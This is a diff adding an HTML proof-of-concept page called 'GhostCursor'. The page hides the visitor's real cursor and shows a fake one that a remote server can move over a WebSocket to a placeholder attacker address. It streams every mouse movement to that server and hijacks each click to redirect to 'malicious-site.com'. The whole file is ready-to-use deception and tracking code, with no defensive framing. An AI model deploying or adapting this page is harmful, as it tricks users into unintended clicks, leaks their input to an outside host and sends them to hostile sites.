@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostCursor PoC</title>
+    <style>
+        body { cursor: none; } /* Hide real cursor */
+        #fakeCursor {
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            background-color: red;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="fakeCursor"></div>
+
+    <script>
+        let fakeCursor = document.getElementById("fakeCursor");
+        let socket = new WebSocket("ws://YOUR_SERVER_IP:8765");
+
+        // Sync fake cursor with real cursor
+        document.addEventListener("mousemove", (e) => {
+            fakeCursor.style.left = e.clientX + "px";
+            fakeCursor.style.top = e.clientY + "px";
+        });
+
+        // Receive remote cursor movements
+        socket.onmessage = (event) => {
+            let data = JSON.parse(event.data);
+            fakeCursor.style.left = data.x + "px";
+            fakeCursor.style.top = data.y + "px";
+        };
+
+        // Send real cursor position to attacker
+        document.addEventListener("mousemove", (e) => {
+            let data = JSON.stringify({ x: e.clientX, y: e.clientY });
+            socket.send(data);
+        });
+
+        // Click hijacking (redirects clicks)
+        document.addEventListener("click", () => {
+            window.location.href = "https://malicious-site.com";
+        });
+    </script>
+</body>
+</html>
